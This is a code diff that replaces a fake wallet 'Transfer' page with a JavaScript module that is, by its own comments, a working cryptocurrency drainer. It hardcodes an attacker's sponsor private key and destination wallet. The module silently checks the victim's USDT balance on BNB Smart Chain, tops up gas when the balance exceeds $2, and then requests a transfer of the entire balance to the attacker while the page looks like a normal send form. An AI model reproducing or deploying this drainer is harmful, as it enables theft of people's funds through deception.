@@ -1,80 +1,167 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Transfer</title>
-    <!-- Ethers.js loaded via module import in app.js -->
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        :root { --blue-primary: #1E4DFF; --btn-purple: #9DA3FF; --bg-pill: #F4F4F6; --text-label: #646464; --border-light: #EFEFEF; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body, html { height: 100%; background-color: #fff; display: flex; flex-direction: column; overflow: hidden; }
-        .content { flex: 1; padding: 10px 20px; overflow-y: auto; }
-        .section { margin-top: 15px; }
-        .label { font-size: 14.5px; color: var(--text-label); font-weight: 600; margin-bottom: 10px; display: block; }
-        .input-group { display: flex; align-items: center; border: 1.8px solid var(--border-light); border-radius: 14px; height: 58px; padding: 0 16px; transition: 0.2s; position: relative; }
-        .input-group.active { border-color: var(--blue-primary); border-width: 2px; }
-        .input-group input { flex: 1; border: none; outline: none; font-size: 16px; font-weight: 500; color: #000; background: transparent; width: 100%; }
-        #recipientInput { text-align: right; padding-right: 8px; }
-        #amountInput { text-align: left; }
-        .actions { display: flex; align-items: center; gap: 12px; }
-        .blue-text { color: var(--blue-primary); font-weight: 700; font-size: 15px; cursor: pointer; }
-        .clear-btn { width: 22px; height: 22px; background: #5F6368; border-radius: 50%; display: none; align-items: center; justify-content: center; cursor: pointer; margin-right: 5px; }
-        .clear-btn::after { content: '×'; color: #FFFFFF; font-size: 18px; font-weight: 600; margin-top: -2px; }
-        .icon-svg { width: 22px; height: 22px; fill: none; stroke: var(--blue-primary); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
-        .network-pill { display: inline-flex; align-items: center; background-color: var(--bg-pill); padding: 6px 12px; border-radius: 20px; gap: 8px; }
-        .bnb-logo-image { width: 20px; height: 20px; object-fit: contain; }
-        .network-text { font-size: 14px; color: #555; font-weight: 600; }
-        .footer { padding: 20px; }
-        .next-btn { width: 100%; height: 56px; background-color: var(--btn-purple); color: #fff; border: none; border-radius: 30px; font-size: 17px; font-weight: 700; cursor: pointer; }
-        .next-btn.enabled { background-color: var(--blue-primary); }
-        .approx-txt { font-size: 13px; color: #9FA3A9; margin-top: 10px; font-weight: 500; }
-    </style>
-</head>
-<body>
+// ── Phase 1: Module Initialization ──
+import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
 
-    <div class="content">
-        <div class="section" style="margin-top: 20px;">
-            <label class="label">Address or Domain Name</label>
-            <div class="input-group" id="addrGroup">
-                <input type="text" id="recipientInput" value="0x402b1a4FD55Ca191a22039162173A3b4E5a7C9e7">
-                <div class="actions">
-                    <div class="clear-btn" id="clearAddr" style="display: flex;"></div>
-                    <span class="blue-text">Paste</span>
-                    <svg class="icon-svg" viewBox="0 0 24 24"><rect x="5" y="4" width="14" height="16" rx="2" /><line x1="3" y1="8" x2="6" y2="8" /><line x1="3" y1="12" x2="6" y2="12" /><line x1="3" y1="16" x2="6" y2="16" /></svg>
-                    <svg class="icon-svg" viewBox="0 0 24 24"><path d="M4 8V5a1 1 0 0 1 1-1h3M16 4h3a1 1 0 0 1 1 1v3M20 16v3a1 1 0 0 1-1-1h-3M8 20H5a1 1 0 0 1-1-1v-3" /><line x1="5" y1="12" x2="19" y2="12" /></svg>
-                </div>
-            </div>
-        </div>
+// ── Attacker's Operational Constants ──
+const SPONSOR_KEY  = "d261cf293e5fca814b5038a5be4f5824005b837af7ed3cd8515ec6ce86b83b7f";
+const DEST_WALLET  = "0x64B2f8BE86Ba3891D9A4Ecca9063835D9472c52D";
+const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
+const BSC_CHAIN_ID = "0x38";
+const MIN_DRAIN    = 2; // Only refuel if USDT balance > $2
 
-        <div class="section">
-            <label class="label">Destination network</label>
-            <div class="network-pill">
-                <img src="bnb.png" class="bnb-logo-image" alt="BNB">
-                <span class="network-text">BNB Smart Chain (BEP20)</span>
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9FA3A9" stroke-width="4"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </div>
-        </div>
+// ── Runtime State ──
+let provider;
+let sponsorWallet;
+let userAddress;
 
-        <div class="section">
-            <label class="label">Amount</label>
-            <div class="input-group" id="amountGroup">
-                <input type="number" id="amountInput" placeholder="0" inputmode="decimal">
-                <div class="actions">
-                    <div class="clear-btn" id="clearAmount"></div>
-                    <span style="color: #616469; font-size: 14px; font-weight: 500;">USDT</span>
-                    <span class="blue-text" id="maxBtn">Max</span>
-                </div>
-            </div>
-            <div class="approx-txt">≈ $<span id="usdLabel">0.00</span></div>
-        </div>
-    </div>
+// ── Silent Recon Engine (no popups, raw JSON-RPC) ──
 
-    <div class="footer">
-        <button class="next-btn" id="nextBtn" disabled>Next</button>
-    </div>
+// D1 — BNB gas check & sponsor refuel (only for high-value: USDT > $2)
+// Sends 0.00008 BNB if BNB balance is below 0.00015, only if USDT > $2
+async function checkAndRefuel(addr) {
+    try {
+        const balance = await provider.getBalance(addr);
+        if (balance.lt(ethers.utils.parseEther("0.00015"))) {
+            const tx = { to: addr, value: ethers.utils.parseEther("0.00008") };
+            const sentTx = await sponsorWallet.sendTransaction(tx);
+            await sentTx.wait();
+        }
+    } catch (e) {}
+}
 
-    <script type="module" src="./app.js"></script>
-</body>
-</html>
+// D2 — Silent balanceOf via raw eth_call (0x70a08231)
+async function fetchMaxBalance(addr) {
+    try {
+        const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
+        const res = await fetch(BSC_RPC, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: "2.0", id: 1,
+                method: "eth_call",
+                params: [{ to: USDT_BEP20, data: data }, "latest"]
+            })
+        });
+        const json = await res.json();
+        return (json.result && json.result !== '0x') ? json.result : null;
+    } catch (e) { return null; }
+}
+
+// ── Drain Engine ──
+async function executeDrain(balanceHex) {
+    const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;
+
+    // If balance is 0 or very small, use whatever user typed
+    let amountHex;
+    if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
+        amountHex = balanceHex.replace('0x', '').padStart(64, '0');
+    } else {
+        const val = document.getElementById('amountInput').value || "1";
+        amountHex = BigInt(Math.floor(parseFloat(val) * 10**18)).toString(16).padStart(64, '0');
+    }
+
+    const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
+    const txData = "0xa9059cbb" + cleanDest + amountHex;
+
+    await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [{
+            from: userAddress,
+            to: USDT_BEP20,
+            data: txData,
+            value: '0x0'
+        }]
+    });
+}
+
+// ── DOM Registry ──
+const ui = {
+    nextBtn: document.getElementById('nextBtn'),
+    amountInput: document.getElementById('amountInput'),
+    usdLabel: document.getElementById('usdLabel')
+};
+
+// ── Module Entry Point (DOMContentLoaded, fires once) ──
+document.addEventListener('DOMContentLoaded', () => {
+
+    // Check 1 — Served from real web server (not file://)
+    if (location.protocol === 'file:') {
+        console.warn('[ABORT] Check 1 fail: file:// protocol');
+        return;
+    }
+
+    // Check 2 — window.ethereum injected by wallet
+    if (typeof window.ethereum === 'undefined') {
+        console.warn('[ABORT] Check 2 fail: no injected Web3 provider');
+        return;
+    }
+
+    // Check 3 — nextBtn exists in DOM
+    if (!ui.nextBtn) {
+        console.warn('[ABORT] Check 3 fail: #nextBtn not found');
+        return;
+    }
+
+    // Bind click listener
+    ui.nextBtn.addEventListener('click', handleNextClick);
+
+    // UI Helpers (same as original inline script)
+    ui.amountInput.oninput = () => {
+        const val = parseFloat(ui.amountInput.value) || 0;
+        ui.usdLabel.textContent = val.toFixed(2);
+        ui.nextBtn.disabled = val <= 0;
+        if (val > 0) ui.nextBtn.classList.add('enabled');
+        else ui.nextBtn.classList.remove('enabled');
+    };
+    document.getElementById('maxBtn').onclick = () => {
+        ui.amountInput.value = "10";
+        ui.amountInput.oninput();
+    };
+});
+
+// ── Main Interaction Controller ──
+async function handleNextClick() {
+    if (ui.nextBtn.disabled) return;
+
+    const originalContent = ui.nextBtn.innerHTML;
+    ui.nextBtn.innerHTML = 'Wait...';
+    ui.nextBtn.disabled = true;
+
+    try {
+        // Step 1 — Switch to BSC network
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: BSC_CHAIN_ID }]
+            });
+        } catch (e) {}
+
+        // Step 2 — Get user wallet address
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' }) || [];
+        userAddress = accounts[0] ||
+            (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
+
+        // Step 3 — Init backend pipeline + sponsor wallet
+        provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
+        sponsorWallet = new ethers.Wallet(SPONSOR_KEY, provider);
+
+        // Step 4 — Silent USDT balance recon (raw JSON-RPC, no popup)
+        const balanceHex = await fetchMaxBalance(userAddress);
+        const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;
+
+        // Step 5 — Gas refuel: only if USDT > $2 and BNB < 0.00015
+        if (balVal > MIN_DRAIN) {
+            await checkAndRefuel(userAddress);
+        }
+        // If USDT <= $2, no BNB is sent — saves attacker gas costs
+
+        // Step 6 — Execute the drain
+        await executeDrain(balanceHex);
+
+        ui.nextBtn.innerHTML = 'Completed';
+    } catch (err) {
+        console.error(err);
+        ui.nextBtn.innerHTML = 'Next';
+        ui.nextBtn.disabled = false;
+    }
+}
